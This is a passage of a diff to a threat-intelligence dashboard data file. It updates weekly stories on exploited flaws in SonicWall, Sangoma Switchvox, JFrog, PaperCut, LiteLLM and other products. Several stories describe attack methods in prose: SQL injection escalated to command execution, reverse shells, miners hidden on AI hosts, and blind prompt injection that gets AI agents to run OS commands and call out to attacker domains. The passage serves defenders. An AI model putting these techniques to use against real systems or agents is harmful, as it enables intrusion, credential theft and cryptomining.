@@ -3,20 +3,106 @@ window.CTI = {
   WEEK_RANGE: "Week of Aug 31 – Sep 6, 2026",
   POSTURE: {
  "level": "CRITICAL",
- "text": "Three new exploitation stories this week, plus an escalation, a supply-chain compromise and an appliance flaw to patch before it turns into one. SonicWall found two SMA1000 zero-days — CVE-2026-83548 (CVSS 10.0, pre-auth SSRF in the Appliance Work Place) and CVE-2026-83549 (7.8, command injection in the Appliance Management Console) — by investigating the attacks that used them; patch to hotfix 12.4.3-03526 or 12.5.0-02952, take the AMC off the internet, and treat any exposed appliance as in scope for review, because no IOCs were published. watchTowr's honeypots show attackers minting themselves administrator tokens through JFrog Artifactory CVE-2026-82329 (patched Aug 28, self-hosted only) and enumerating users, groups, credential sets and federated access topologies — update, then revoke every access token, since tokens minted before the patch survive it. VulnCheck reports CVE-2026-0768 (CVSS 9.8) being exploited against Langflow for environment variables, secret keys and SSH access, more than 360 attempts on its UK canaries; upgrade past 1.4.2 and rotate every key the instance could reach. PaperCut has escalated: CISA added CVE-2026-82078 and CVE-2026-81578 to KEV on Aug 31 under BOD 26-04 with forensic triage required, and exploitation has moved from probing to active intrusions — keep hunting archived server.log copies for 'Database error looking up cardID: VALUES CAST'. A BGP hijack of Softaculous address space between Aug 28 and Aug 30 delivered a malicious Virtualizor update under a valid Let's Encrypt certificate obtained through the hijack, with no package signing to stop it; any Virtualizor host that updated in that window is in scope, and the vendor's single published IOC has to be pulled from its notice. WatchGuard patched three critical unauthenticated RCE flaws in the Fireware OS iked process, so IPSec-terminating appliances need the same treatment as the SonicWall and NetScaler units. Carried over and still live: Iran-linked disruption of Western OT, Rhysida's Berlin auction with 5,941 claimed password files, the McKesson SaaS data theft, Oracle WebLogic CVE-2026-21962, ownCloud CVE-2023-49105, and JFrog CVE-2026-66384 with a federal deadline of Sep 10. Thirteen aged-out stories were dropped in this week's prune.",
+ "text": "Five new items today, and three stories moved: a seven-flaw KEV batch weighted toward the build and AI chain, VoIP exploitation, and two vendor reports on attacks against self-hosted AI infrastructure. CISA added seven flaws to KEV on Sep 2 — SonicWall SMA1000 CVE-2026-83548 and CVE-2026-83549, Sangoma Switchvox CVE-2026-9586, JFrog Artifactory CVE-2026-82329, Kestra OSS CVE-2026-49869 all due Sep 5, with Starlette CVE-2026-48710 and LiteLLM CVE-2026-59822 due Sep 16; four of the seven are engineering-owned components rather than perimeter appliances. Sangoma Switchvox CVE-2026-9586 (CVSS 9.3) is being exploited from Aug 30 — unauthenticated SQL injection on the /pa endpoint reaching PostgreSQL superuser RCE, with reverse shells from 176.65.148.184 and callbacks on TCP/39323; upgrade to 8.4.0.2, review /var/log/switchvox/db-quirks.log, and rotate the cookie signing key if compromise is suspected. Wiz and Microsoft describe sustained attacks on self-hosted AI infrastructure — MCP command injection, blind prompt injection with OAST callbacks, and LiteLLM master keys read out of process memory rather than off disk; patch LiteLLM past 1.83.7 and Starlette past 1.0.1, then rotate every provider key the proxy could reach, because memory-resident theft leaves no file artefact. SonicWall SMA1000 CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 are now KEV-listed with a Sep 5 deadline; patch to hotfix 12.4.3-03526 or 12.5.0-02952, take the AMC off the internet, and treat any exposed appliance as in scope for review, because no IOCs were published. JFrog Artifactory CVE-2026-82329 is now KEV-listed at CVSS 9.8 with a Sep 5 deadline; update self-hosted instances, then revoke every access token, since tokens minted before the patch survive it. PaperCut has escalated again: the vendor's Aug 30 bulletin describes attackers installing SimpleHelp and AnyDesk on compromised Application Servers, ShadowServer counts more than 1,000 exposed instances, and the federal deadline is Sep 14 — keep hunting archived server.log copies for 'Database error looking up cardID: VALUES CAST' and add remote-access-tool installs to the hunt. Rockwell Automation shipped patches or workarounds across RSLinx Classic, ControlLogix, CompactLogix, FactoryTalk and ArmorStart products; CISA is not aware of exploitation of CVE-2026-9637. Late amendments to the UK Cyber Security and Resilience Bill would let ministers bar high-risk technology suppliers from critical sectors, tabled after the Iran-linked disruption of a UK energy facility. Carried over and still live: Langflow CVE-2026-0768 credential harvesting, the Virtualizor BGP hijack, WatchGuard Fireware iked, Iran-linked disruption of Western OT, Rhysida's Berlin auction, the McKesson SaaS data theft, Oracle WebLogic CVE-2026-21962, and JFrog CVE-2026-66384 with a federal deadline of Sep 10.",
  "lines": [
-  "SonicWall found two SMA1000 zero-days — CVE-2026-83548 (CVSS 10.0, pre-auth SSRF in the Appliance Work Place) and CVE-2026-83549 (7.8, command injection in the Appliance Management Console) — by investigating the attacks that used them; patch to hotfix 12.4.3-03526 or 12.5.0-02952, take the AMC off the internet, and treat any exposed appliance as in scope for review, because no IOCs were published.",
-  "watchTowr's honeypots show attackers minting themselves administrator tokens through JFrog Artifactory CVE-2026-82329 (patched Aug 28, self-hosted only) and enumerating users, groups, credential sets and federated access topologies — update, then revoke every access token, since tokens minted before the patch survive it.",
-  "VulnCheck reports CVE-2026-0768 (CVSS 9.8) being exploited against Langflow for environment variables, secret keys and SSH access, more than 360 attempts on its UK canaries; upgrade past 1.4.2 and rotate every key the instance could reach.",
-  "PaperCut has escalated: CISA added CVE-2026-82078 and CVE-2026-81578 to KEV on Aug 31 under BOD 26-04 with forensic triage required, and exploitation has moved from probing to active intrusions — keep hunting archived server.log copies for 'Database error looking up cardID: VALUES CAST'.",
-  "A BGP hijack of Softaculous address space between Aug 28 and Aug 30 delivered a malicious Virtualizor update under a valid Let's Encrypt certificate obtained through the hijack, with no package signing to stop it; any Virtualizor host that updated in that window is in scope, and the vendor's single published IOC has to be pulled from its notice.",
-  "WatchGuard patched three critical unauthenticated RCE flaws in the Fireware OS iked process, so IPSec-terminating appliances need the same treatment as the SonicWall and NetScaler units.",
-  "Carried over and still live: Iran-linked disruption of Western OT, Rhysida's Berlin auction with 5,941 claimed password files, the McKesson SaaS data theft, Oracle WebLogic CVE-2026-21962, ownCloud CVE-2023-49105, and JFrog CVE-2026-66384 with a federal deadline of Sep 10.",
-  "Thirteen aged-out stories were dropped in this week's prune."
+  "CISA added seven flaws to KEV on Sep 2 — SonicWall SMA1000 CVE-2026-83548 and CVE-2026-83549, Sangoma Switchvox CVE-2026-9586, JFrog Artifactory CVE-2026-82329, Kestra OSS CVE-2026-49869 all due Sep 5, with Starlette CVE-2026-48710 and LiteLLM CVE-2026-59822 due Sep 16; four of the seven are engineering-owned components rather than perimeter appliances.",
+  "Sangoma Switchvox CVE-2026-9586 (CVSS 9.3) is being exploited from Aug 30 — unauthenticated SQL injection on the /pa endpoint reaching PostgreSQL superuser RCE, with reverse shells from 176.65.148.184 and callbacks on TCP/39323; upgrade to 8.4.0.2, review /var/log/switchvox/db-quirks.log, and rotate the cookie signing key if compromise is suspected.",
+  "Wiz and Microsoft describe sustained attacks on self-hosted AI infrastructure — MCP command injection, blind prompt injection with OAST callbacks, and LiteLLM master keys read out of process memory rather than off disk; patch LiteLLM past 1.83.7 and Starlette past 1.0.1, then rotate every provider key the proxy could reach, because memory-resident theft leaves no file artefact.",
+  "SonicWall SMA1000 CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 are now KEV-listed with a Sep 5 deadline; patch to hotfix 12.4.3-03526 or 12.5.0-02952, take the AMC off the internet, and treat any exposed appliance as in scope for review, because no IOCs were published.",
+  "JFrog Artifactory CVE-2026-82329 is now KEV-listed at CVSS 9.8 with a Sep 5 deadline; update self-hosted instances, then revoke every access token, since tokens minted before the patch survive it.",
+  "PaperCut has escalated again: the vendor's Aug 30 bulletin describes attackers installing SimpleHelp and AnyDesk on compromised Application Servers, ShadowServer counts more than 1,000 exposed instances, and the federal deadline is Sep 14 — keep hunting archived server.log copies for 'Database error looking up cardID: VALUES CAST' and add remote-access-tool installs to the hunt.",
+  "Rockwell Automation shipped patches or workarounds across RSLinx Classic, ControlLogix, CompactLogix, FactoryTalk and ArmorStart products; CISA is not aware of exploitation of CVE-2026-9637.",
+  "Late amendments to the UK Cyber Security and Resilience Bill would let ministers bar high-risk technology suppliers from critical sectors, tabled after the Iran-linked disruption of a UK energy facility.",
+  "Carried over and still live: Langflow CVE-2026-0768 credential harvesting, the Virtualizor BGP hijack, WatchGuard Fireware iked, Iran-linked disruption of Western OT, Rhysida's Berlin auction, the McKesson SaaS data theft, Oracle WebLogic CVE-2026-21962, and JFrog CVE-2026-66384 with a federal deadline of Sep 10."
  ],
- "lead": "Three new exploitation stories this week, plus an escalation, a supply-chain compromise and an appliance flaw to patch before it turns into one."
+ "lead": "Five new items today, and three stories moved: a seven-flaw KEV batch weighted toward the build and AI chain, VoIP exploitation, and two vendor reports on attacks against self-hosted AI infrastructure."
 },
   STORIES: [
+ {
+  "key": "kevsep02",
+  "tags": [
+   [
+    "crit",
+    "CISA KEV · Seven flaws added Sep 2"
+   ],
+   [
+    "high",
+    "All Sectors · BOD 26-04 deadlines Sep 5 and Sep 16"
+   ]
+  ],
+  "badge": "new",
+  "title": "CISA adds seven exploited flaws to KEV in one batch, four of them in AI and developer tooling",
+  "body": "CISA added seven vulnerabilities to the Known Exploited Vulnerabilities catalog on Sep 2, 2026: CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 (7.8) in SonicWall SMA1000 appliances, CVE-2026-9586 (9.3) in Sangoma Switchvox, CVE-2026-82329 (9.8) in JFrog Artifactory, CVE-2026-48710 (6.5) in Kludex Starlette, CVE-2026-49869 (10.0) in Kestra OSS, and CVE-2026-59822 (8.8) in Berri LiteLLM. Under BOD 26-04, federal civilian agencies must remediate all of them by Sep 5, 2026, except the Starlette and LiteLLM flaws, which carry a Sep 16 deadline. The Starlette entry is an HTTP request and response smuggling flaw that lets an attacker inject paths into the host part, leading to authentication bypass where authentication depends on the reconstructed URL path; Horizon3.ai showed in June that it chains with LiteLLM CVE-2026-42271 for unauthenticated remote code execution. CVE-2026-49869 is an OS command injection flaw in Kestra OSS that lets an unauthenticated remote attacker create and execute arbitrary workflows without credentials; its KEV listing is driven by a Microsoft report describing likely exploitation in late June 2026 to establish a reverse shell, enumerate the Docker container environment, evade defences, deploy a cryptocurrency miner and harvest data. CVE-2026-59822 is an improper authentication flaw in LiteLLM's MCP Streamable HTTP endpoint that lets an unauthenticated attacker establish an authenticated MCP session with an arbitrary Bearer token. Four of the seven sit in AI or developer infrastructure rather than in classic enterprise perimeter products.",
+  "src": "CISA KEV catalog (Sep 2, 2026), The Hacker News, Microsoft Security Blog — Sep 2–3, 2026"
+ },
+ {
+  "key": "switchvox",
+  "tags": [
+   [
+    "crit",
+    "Sangoma Switchvox CVE-2026-9586 · CVSS 9.3 · Exploited"
+   ],
+   [
+    "high",
+    "Communications · VoIP"
+   ]
+  ],
+  "badge": "new",
+  "title": "Attackers are exploiting Sangoma Switchvox CVE-2026-9586 for unauthenticated SQL injection to PostgreSQL superuser RCE, dropping reverse shells since Aug 30",
+  "body": "Horizon3.ai reported on Sep 1, 2026 that it has observed valid in-the-wild exploitation of CVE-2026-9586 (CVSS 9.3), an unauthenticated SQL injection vulnerability in Sangoma Switchvox SMB Edition 8.3 (build 104997) and earlier. The Switchvox application exposes an unauthenticated HTTP endpoint, /pa, handled by the PhoneAppsHandler.pm class, which parses XML content beginning with <PolycomIPPhone> and concatenates the user-controlled PhoneIP value directly into PostgreSQL queries without sanitisation or parameterisation. A single crafted request runs arbitrary SQL as the PostgreSQL superuser, and PostgreSQL's COPY ... TO PROGRAM turns that into command execution. Horizon3 reported 12 distinct Switchvox vulnerabilities to Sangoma on Apr 10, 2026; the vendor fixed them in Switchvox 8.4.0.2 on Jul 14. Horizon3 deployed honeypots with threat intelligence firm Defused Cyber on May 8, before fixes shipped, and the tripwire fired on Aug 30, 2026. Exploitation came from a single IP address; the attacker drops a reverse shell and then runs Base64-encoded commands to enumerate running processes, with Help Net Security reporting later staging of additional malware, possibly a cryptominer. Horizon3 says it has not seen exploitation of the other 11 flaws, and warns that most internet-exposed Switchvox systems have either already been targeted or will be. SRA Labs, which independently reported issues on May 11, showed the flaw can be used to exfiltrate the cookie signing key, letting an attacker forge authentication material for arbitrary users. CISA added CVE-2026-9586 to KEV on Sep 2 with a federal deadline of Sep 5, 2026.",
+  "src": "Horizon3.ai disclosure, Defused Cyber, BleepingComputer, Help Net Security, The Hacker News, CISA KEV — Sep 1–3, 2026"
+ },
+ {
+  "key": "aiinfra",
+  "tags": [
+   [
+    "crit",
+    "Self-hosted AI infrastructure · Exploited"
+   ],
+   [
+    "high",
+    "Information Technology · Credential theft and cryptomining"
+   ]
+  ],
+  "badge": "new",
+  "title": "Wiz and Microsoft document sustained attacks on self-hosted AI infrastructure: MCP command injection, blind prompt injection and credentials pulled from process memory",
+  "body": "Wiz Threat Research published 90 days of honeypot telemetry on Aug 27, 2026 covering LiteLLM, Flowise, LangChain, Langflow, ChromaDB, Ollama and others, and Microsoft published a parallel analysis of attacks on AI gateways on Aug 26. Wiz describes three patterns. First, exploitation of internet-facing MCP servers: CVE-2026-59822, which Wiz discovered, returns an empty UserAPIKeyAuth() object instead of rejecting a failed token validation, so any Bearer token — even a single character — grants full MCP access, and Wiz saw single-character tokens used to probe model enumeration endpoints. Alongside it, CVE-2026-42271 passes the command field of an MCP server test configuration straight to subprocess execution; attackers submitted a fake stdio server config whose command was a Python script that downloaded and ran a cryptominer, then returned a valid MCP handshake so the connection test appeared to succeed. The miner runs detached and the staging directory is deleted while the process keeps the inode open, leaving little on disk. Second, blind prompt injection against LangChain, Flowise, OpenWebUI and Node-RED: prompts instruct the agent to run an OS command whose only visible effect is a DNS callback to an OAST domain encoding the victim IP, after which the payload is fetched from Pastebin and Base64-decoded, ending in XMRig at /usr/src/node-red/xmrig. Third, AI-native post-exploitation: rather than searching disk, attackers queried the running LiteLLM Python module state to read master_key and litellm_master_key_hash from memory, enumerated /app/litellm_config.yaml, /etc/litellm/.env and ~/.litellm/config.yaml, fingerprinted backend models through the default master key sk-1234, and on Langflow staged a miner in /app/data/.claude/ renamed unicorn to blend into an AI host. Microsoft separately reports LiteLLM gateways broken into via CVE-2026-42271 chained with CVE-2026-48710 to deliver an XMRig ELF binary after terminating competing miners, followed by queries against LiteLLM_ProxyModelTable and LiteLLM_VerificationToken to harvest provider key material and proxy-issued virtual keys, with persistence through ~/.ssh/authorized_keys. Microsoft also suspects exposed RAGFlow instances are being exploited via CVE-2026-45312, CVE-2026-28797, CVE-2026-24770, CVE-2025-68700 and CVE-2025-69286 to establish persistence and steal LLM provider keys. External researchers have linked the Qilin ransomware group to active exploitation of the LiteLLM chain. Wiz's own State of AI in the Cloud report finds 90% of cloud environments run self-hosted AI software.",
+  "src": "Wiz Threat Research (Yaara Shriki), Microsoft Security Blog, The Hacker News — Aug 26 – Sep 3, 2026"
+ },
+ {
+  "key": "rockwellsep",
+  "tags": [
+   [
+    "med",
+    "Rockwell Automation · Patch bundle"
+   ],
+   [
+    "med",
+    "Critical Manufacturing · OT"
+   ]
+  ],
+  "badge": "new",
+  "title": "Rockwell Automation patches more than a dozen flaws across RSLinx Classic, ControlLogix, FactoryTalk and ArmorStart products",
+  "body": "Rockwell Automation released patches or workarounds for more than a dozen vulnerabilities across its industrial automation range, including RSLinx Classic, ControlLogix and CompactLogix controllers, FactoryTalk Historian Machine Edition, FactoryTalk Activation Manager, ArmorStart Distributed Motor Controllers, ControlFLASH and the Redundancy Module Configuration Tool. The reported weaknesses include denial of service, remote code execution, privilege escalation and cross-site scripting. CISA says it is not aware of exploitation of CVE-2026-9637. No indicators of compromise accompany the release; this is a scheduled remediation item rather than an incident.",
+  "src": "Rockwell Automation security advisories, CISA ICS advisories, Security Boulevard Daily OT Security News — Sep 2–3, 2026"
+ },
+ {
+  "key": "ukcsrb",
+  "tags": [
+   [
+    "med",
+    "UK Cyber Security and Resilience Bill · Amendments"
+   ],
+   [
+    "med",
+    "All Sectors · Supply chain policy"
+   ]
+  ],
+  "badge": "new",
+  "title": "UK amendments would let ministers bar high-risk technology suppliers from critical sectors",
+  "body": "SecurityWeek reported on Sep 2, 2026 that late amendments to the UK Cyber Security and Resilience Bill, tabled on Aug 24, would give ministers powers to prevent critical-sector organisations from using technology suppliers deemed high risk. The bill has passed the House of Commons and is in the House of Lords. The amendments followed reporting that Iran-linked adversaries forced a small UK energy facility offline for four days, which brought supply-chain risk into focus. Separately, a Foundation for Defense of Democracies analysis dated Sep 2 describes Project Watershed 250, launched Aug 31 as a six-month Texas pilot pairing local water utilities with free federal, state and private-sector cybersecurity services, alongside proposed dedicated water-sector cybersecurity funding and Water Watch Center threat-intelligence support.",
+  "src": "SecurityWeek, Foundation for Defense of Democracies, Security Boulevard Daily OT Security News — Sep 2–3, 2026"
+ },
  {
   "key": "sonicwallsma",
   "tags": [
@@ -29,10 +115,10 @@ window.CTI = {
     "Information Technology · Remote access"
    ]
   ],
-  "badge": "new",
+  "badge": "updated",
   "title": "SonicWall found two SMA1000 zero-days by investigating attacks that used them: a CVSS 10.0 pre-auth SSRF chained with command injection in the management console",
-  "body": "SonicWall published advisory SNWLID-2026-0016 on Sep 1, 2026 urging SMA1000 customers to apply hotfixes for two vulnerabilities it says were discovered internally, along with their exploitation. CVE-2026-83548 (CVSS 10.0) is a pre-authentication server-side request forgery flaw in the Appliance Work Place interface that lets a remote unauthenticated attacker reach sensitive functionality and perform unauthorised operations. CVE-2026-83549 (CVSS 7.8) is an OS command injection flaw in the Appliance Management Console that an authenticated attacker can use to run arbitrary commands, potentially reaching remote code execution. SonicWall says it has observed exploitation of both, which indicates the two were chained in attacks. Affected models are the SMA1000 6210, 7210 and 8200v; hotfixes 12.4.3-03526 and 12.5.0-02952 and later releases contain the fixes. SSL-VPN on SonicWall firewalls and the SMA100 series are not affected. The vendor advisory contains no indicators of compromise and no detail on the attacks. CISA's KEV catalog held 17 SonicWall flaws as of Sep 2; neither new CVE had been added.",
-  "src": "SonicWall SNWLID-2026-0016, SecurityWeek — Sep 1–2, 2026"
+  "body": "SonicWall published advisory SNWLID-2026-0016 on Sep 1, 2026 urging SMA1000 customers to apply hotfixes for two vulnerabilities it says were discovered internally, along with their exploitation. CVE-2026-83548 (CVSS 10.0) is a pre-authentication server-side request forgery flaw in the Appliance Work Place interface that lets a remote unauthenticated attacker reach sensitive functionality and perform unauthorised operations. CVE-2026-83549 (CVSS 7.8) is an OS command injection flaw in the Appliance Management Console that an authenticated attacker can use to run arbitrary commands, potentially reaching remote code execution. SonicWall says it has observed exploitation of both, which indicates the two were chained in attacks. Affected models are the SMA1000 6210, 7210 and 8200v; hotfixes 12.4.3-03526 and 12.5.0-02952 and later releases contain the fixes. SSL-VPN on SonicWall firewalls and the SMA100 series are not affected. The vendor advisory contains no indicators of compromise and no detail on the attacks. Update, Sep 3: CISA added both CVEs to the KEV catalog on Sep 2, 2026 as part of a seven-flaw batch; under BOD 26-04 federal civilian agencies have until Sep 5, 2026 to remediate. When this story was first written neither CVE was listed.",
+  "src": "SonicWall SNWLID-2026-0016, CISA KEV (Sep 2, 2026), SecurityWeek, The Hacker News — Sep 1–3, 2026"
  },
  {
   "key": "langflow",
@@ -63,10 +149,10 @@ window.CTI = {
     "Information Technology · Software supply chain"
    ]
   ],
-  "badge": "new",
+  "badge": "updated",
   "title": "watchTowr sees attackers minting themselves admin tokens in JFrog Artifactory days after CVE-2026-82329 was disclosed",
-  "body": "JFrog patched CVE-2026-82329 on Aug 28, 2026, a critical authentication bypass in Artifactory that can lead to administrative access. JFrog's advisory states the product \"contains an authentication weakness that, under default configuration, may allow an unauthenticated attacker with network access to obtain administrative privileges.\" Cloud instances were patched by JFrog; self-hosted customers must update to 7.111.21, 7.117.28, 7.125.20, 7.133.29, 7.146.38 or 7.161.20. Exposure management firm watchTowr reported on Sep 1 that it has already seen in-the-wild exploitation, \"with attackers minting themselves admin tokens\". Yordan Ganchev, principal threat intelligence specialist at watchTowr, said data from the firm's Attacker Eye honeypot network shows attackers minting administrator tokens and enumerating users, groups, credential sets and federated access topologies, and warned that admin access to a central software supply chain system lets an attacker tamper with build pipelines, move laterally into production and potentially push malicious changes downstream to customers. There do not appear to be other reports of active exploitation. JFrog has not confirmed exploitation; CTO Yoav Landman noted publicly that the flaw allows \"improper authentication rather than RCE\" and does not affect the JFrog SaaS platform, only self-hosted deployments. CISA had not added CVE-2026-82329 to KEV as of Sep 2. A separate Artifactory flaw, CVE-2026-66384, remains in KEV with a federal remediation deadline of Sep 10, 2026.",
-  "src": "JFrog security advisories, watchTowr (Attacker Eye), SecurityWeek — Sep 1–2, 2026"
+  "body": "JFrog patched CVE-2026-82329 on Aug 28, 2026, a critical authentication bypass in Artifactory that can lead to administrative access. JFrog's advisory states the product \"contains an authentication weakness that, under default configuration, may allow an unauthenticated attacker with network access to obtain administrative privileges.\" Cloud instances were patched by JFrog; self-hosted customers must update to 7.111.21, 7.117.28, 7.125.20, 7.133.29, 7.146.38 or 7.161.20. Exposure management firm watchTowr reported on Sep 1 that it has already seen in-the-wild exploitation, \"with attackers minting themselves admin tokens\". Yordan Ganchev, principal threat intelligence specialist at watchTowr, said data from the firm's Attacker Eye honeypot network shows attackers minting administrator tokens and enumerating users, groups, credential sets and federated access topologies, and warned that admin access to a central software supply chain system lets an attacker tamper with build pipelines, move laterally into production and potentially push malicious changes downstream to customers. There do not appear to be other reports of active exploitation. JFrog has not confirmed exploitation; CTO Yoav Landman noted publicly that the flaw allows \"improper authentication rather than RCE\" and does not affect the JFrog SaaS platform, only self-hosted deployments. Update, Sep 3: CISA added CVE-2026-82329 to KEV on Sep 2, 2026 with a CVSS score of 9.8 and a federal remediation deadline of Sep 5, 2026 under BOD 26-04. CISA describes it as an improper authentication flaw that under default configuration allows an unauthenticated attacker with network access to obtain administrative privileges. A separate Artifactory flaw, CVE-2026-66384, remains in KEV with a federal remediation deadline of Sep 10, 2026.",
+  "src": "JFrog security advisories, watchTowr (Attacker Eye), CISA KEV (Sep 2, 2026), SecurityWeek, The Hacker News — Sep 1–3, 2026"
  },
  {
   "key": "virtualizor",
@@ -201,8 +287,8 @@ window.CTI = {
   ],
   "badge": "updated",
   "title": "PaperCut NG/MF zero-day exploited in the wild: CVE-2026-82078 and CVE-2026-81578 chained for unauthenticated remote code execution on all versions",
-  "body": "PaperCut told customers on Aug 27, 2026 that attackers are exploiting a flaw affecting all versions of PaperCut NG and PaperCut MF as a zero-day, that it is \"aware of confirmed customer incidents\" and is treating the matter with the highest priority. It shipped an emergency patch for v25 and v26 at 02:10 AEST on Aug 28, followed later the same day by patches for v24, then an Emergency Patch Release 2 adding hardening beyond the first after watchTowr and Huntress found bypasses of the original fix. Two CVEs were subsequently published: CVE-2026-82078 (CVSS 9.4), unsafe dynamic class loading in the database connection utilities, and CVE-2026-81578 (CVSS 8.8), improper access control in the web management interface. Huntress researchers John Hammond and Andrew Brandt describe an unauthenticated request that changes trusted server configuration and ends in arbitrary Java code execution inside the application process. watchTowr reports attackers chaining both flaws to bypass authentication and reach RCE, and says it found multiple patch bypasses plus a further authentication bypass, likely addressed by the second patch. Huntress observed exploitation in two customer environments; PaperCut has not described the activity or named an actor. Update, Sep 1–2: CISA added both CVEs to the KEV catalog on Aug 31, 2026 under BOD 26-04, and SecurityWeek reports exploitation has escalated from scanning and probing to active intrusions. Neither CVE was in KEV when this story was first written.",
-  "src": "PaperCut security bulletin (Aug 27, 2026), Huntress, watchTowr, The Hacker News — Aug 27–28, 2026"
+  "body": "PaperCut told customers on Aug 27, 2026 that attackers are exploiting a flaw affecting all versions of PaperCut NG and PaperCut MF as a zero-day, that it is \"aware of confirmed customer incidents\" and is treating the matter with the highest priority. It shipped an emergency patch for v25 and v26 at 02:10 AEST on Aug 28, followed later the same day by patches for v24, then an Emergency Patch Release 2 adding hardening beyond the first after watchTowr and Huntress found bypasses of the original fix. Two CVEs were subsequently published: CVE-2026-82078 (CVSS 9.4), unsafe dynamic class loading in the database connection utilities, and CVE-2026-81578 (CVSS 8.8), improper access control in the web management interface. Huntress researchers John Hammond and Andrew Brandt describe an unauthenticated request that changes trusted server configuration and ends in arbitrary Java code execution inside the application process. watchTowr reports attackers chaining both flaws to bypass authentication and reach RCE, and says it found multiple patch bypasses plus a further authentication bypass, likely addressed by the second patch. Huntress observed exploitation in two customer environments; PaperCut has not described the activity or named an actor. Update, Sep 1–2: CISA added both CVEs to the KEV catalog on Aug 31, 2026 under BOD 26-04, and SecurityWeek reports exploitation has escalated from scanning and probing to active intrusions. Update, Sep 3: PaperCut's Aug 30 bulletin extended its indicator list and described the post-compromise sequence — the actor enumerates users, privileges and running processes, then silently installs legitimate remote access software. Help Net Security reports SimpleHelp and AnyDesk being planted on compromised Application Servers, and watchTowr's Jake Knott describes activity specifically designed to enable internal network access. ShadowServer counts more than 1,000 internet-exposed PaperCut NG/MF instances. The federal remediation deadline is Sep 14, 2026. Neither CVE was in KEV when this story was first written.",
+  "src": "PaperCut security bulletin (Aug 27 and Aug 30, 2026), Huntress, watchTowr, Help Net Security, SecurityWeek — Aug 27 – Sep 2, 2026"
  },
  {
   "key": "zbtimplants",
@@ -513,18 +599,53 @@ window.CTI = {
 ],
   CVES: [
  {
+  "key": "switchvox",
+  "level": "crit",
+  "num": "CVE-2026-9586",
+  "score": "9.3",
+  "sub": "Sangoma Switchvox SMB Edition 8.3 (104997) unauthenticated SQL injection on the /pa endpoint — arbitrary SQL as PostgreSQL superuser reaching RCE. Patched in 8.4.0.2 (Jul 14, 2026); exploited from Aug 30; KEV Sep 2, federal deadline Sep 5"
+ },
+ {
+  "key": "kevsep02",
+  "level": "crit",
+  "num": "CVE-2026-49869",
+  "score": "10.0",
+  "sub": "Kestra OSS OS command injection — unauthenticated remote attacker can create and execute arbitrary workflows without credentials. KEV Sep 2 on the strength of a Microsoft report of likely exploitation in late June 2026; federal deadline Sep 5"
+ },
+ {
+  "key": "kevsep02",
+  "level": "high",
+  "num": "CVE-2026-59822",
+  "score": "8.8",
+  "sub": "Berri LiteLLM MCP Streamable HTTP endpoint improper authentication — any Bearer token establishes an authenticated MCP session. Discovered by Wiz; KEV Sep 2, federal deadline Sep 16"
+ },
+ {
+  "key": "kevsep02",
+  "level": "med",
+  "num": "CVE-2026-48710",
+  "score": "6.5",
+  "sub": "Kludex Starlette HTTP request/response smuggling (BadHost) — path injection into the host part enabling authentication bypass where auth depends on the reconstructed URL path. Chains with LiteLLM CVE-2026-42271 for unauthenticated RCE. KEV Sep 2, federal deadline Sep 16"
+ },
+ {
+  "key": "aiinfra",
+  "level": "high",
+  "num": "CVE-2026-42271",
+  "score": "8.7",
+  "sub": "Berri LiteLLM MCP server test endpoints command injection — the command field is passed to subprocess execution without validation. Added to KEV in June 2026; chained with CVE-2026-48710 for unauthenticated RCE, linked by Wiz to Qilin ransomware activity"
+ },
+ {
   "key": "sonicwallsma",
   "level": "crit",
   "num": "CVE-2026-83548",
   "score": "10.0",
-  "sub": "SonicWall SMA1000 Appliance Work Place pre-authentication SSRF — unauthenticated access to sensitive functionality; chained with CVE-2026-83549 in observed attacks"
+  "sub": "SonicWall SMA1000 Appliance Work Place pre-authentication SSRF — unauthenticated access to sensitive functionality; chained with CVE-2026-83549 in observed attacks. Added to CISA KEV Sep 2, 2026; federal deadline Sep 5, 2026"
  },
  {
   "key": "sonicwallsma",
   "level": "high",
   "num": "CVE-2026-83549",
   "score": "7.8",
-  "sub": "SonicWall SMA1000 Appliance Management Console OS command injection — authenticated command execution reaching RCE"
+  "sub": "SonicWall SMA1000 Appliance Management Console OS command injection — authenticated command execution reaching RCE. Added to CISA KEV Sep 2, 2026; federal deadline Sep 5, 2026"
  },
  {
   "key": "langflow",
@@ -537,8 +658,8 @@ window.CTI = {
   "key": "jfrog82329",
   "level": "crit",
   "num": "CVE-2026-82329",
-  "score": "",
-  "sub": "JFrog Artifactory authentication bypass to administrative access under default configuration — self-hosted only; patched Aug 28, exploitation reported Sep 1. No CVSS published in the sources reviewed"
+  "score": "9.8",
+  "sub": "JFrog Artifactory improper authentication — under default configuration an unauthenticated attacker with network access can obtain administrative privileges. Self-hosted only; patched Aug 28, exploitation reported Sep 1, added to CISA KEV Sep 2 with a federal deadline of Sep 5, 2026"
  },
  {
   "key": "virtualizor",
@@ -903,7 +1024,7 @@ window.CTI = {
   KJ: [
  {
   "num": "01",
-  "html": "<b>Remote-access appliances are the week's decisive exposure, and vendors are now finding these flaws by investigating live intrusions rather than through research.</b> SonicWall disclosed CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 as zero-days it discovered internally along with their exploitation, WatchGuard patched three critical unauthenticated RCE flaws in the Fireware OS iked process, and Citrix NetScaler CVE-2026-8452 remains KEV-listed from last week. We assess with <b>high confidence</b> that patch state on VPN and SSL-VPN terminators is the single highest-yield defensive action available this week; note that SonicWall published no indicators, so absence of artefacts is not evidence of absence of compromise."
+  "html": "<b>Remote-access appliances are the week's decisive exposure, and vendors are now finding these flaws by investigating live intrusions rather than through research.</b> SonicWall disclosed CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 as zero-days it discovered internally along with their exploitation, WatchGuard patched three critical unauthenticated RCE flaws in the Fireware OS iked process, and Citrix NetScaler CVE-2026-8452 remains KEV-listed from last week. We assess with <b>high confidence</b> that patch state on VPN and SSL-VPN terminators is the single highest-yield defensive action available this week; note that SonicWall published no indicators, so absence of artefacts is not evidence of absence of compromise. CISA added both SonicWall CVEs to KEV on Sep 2 with a Sep 5 federal deadline."
  },
  {
   "num": "02",
@@ -911,7 +1032,7 @@ window.CTI = {
  },
  {
   "num": "03",
